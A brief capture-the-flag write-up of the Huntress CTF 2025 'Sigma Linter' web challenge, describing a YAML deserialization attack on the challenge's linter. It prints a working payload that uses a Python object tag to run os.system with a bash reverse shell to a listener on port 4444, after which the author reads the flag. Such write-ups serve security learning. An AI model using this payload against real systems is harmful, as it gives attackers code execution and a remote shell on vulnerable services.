---
title: "Huntress CTF 2025 Writeup: Sigma Linter"
date: 2025-11-01 16:36:48 +0100
categories: ["Huntress CTF 2025"]
tags: ["Web", "CTF", "Huntress", "Deserialization"]
image: https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/sigma-linter-1.png
---

> Oh wow, another web app interface for command-line tools that already exist!
> This one seems a little busted, though...
---

I learnt that the webapp was validating yaml, and so I tried to carry out a deserialization attack.

I added a new line and entered the [following code](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-yaml-privilege-escalation) (found by my teammate) while listening on port `4444`:

```yaml
user_input: !!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.200.3.4/4444 0>&1"']
```


And I was in!! After that, I just catt'd the flag.

![sigma-linter-2.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/sigma-linter-2.png)
